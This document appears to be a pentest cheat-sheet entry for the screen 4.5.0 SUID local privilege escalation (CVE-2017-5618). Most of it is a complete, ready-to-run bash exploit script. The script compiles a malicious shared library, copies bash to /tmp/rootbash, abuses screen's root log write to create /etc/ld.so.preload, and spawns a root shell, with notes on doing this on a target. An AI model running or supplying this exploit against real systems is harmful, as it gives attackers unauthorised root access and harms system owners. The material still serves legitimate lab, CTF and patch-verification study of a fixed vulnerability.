# screen 4.5.0 SUID Local Privilege Escalation

screen 4.5.0 with SUID bit set is vulnerable to a local privilege escalation via the `ld.so.preload` mechanism (CVE-2017-5618).

## Check Vulnerable Version
```bash
find / -perm -u=s -type f 2>/dev/null | grep screen
/bin/screen-4.5.0
screen --version
```

## Exploit (script)
```bash
#!/bin/bash
# rootshell.c - compile and place as shared lib
cat > /tmp/rootshell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootbash", 0, 0);
    chmod("/tmp/rootbash", 04755);
    unlink("/etc/ld.so.preload");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/rootshell.c

# Copy bash to use as rootbash
cp /bin/bash /tmp/rootbash

# Trigger screen to write /etc/ld.so.preload
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
# screen will add the preload entry and trigger our lib
screen -ls

/tmp/rootbash -p
```

## Notes
- Requires gcc on target, or pre-compile the .so offbox (same arch)
- The write to `/etc/ld.so.preload` is the key — screen writes a log file as root via SUID
- Fixed in screen 4.5.1
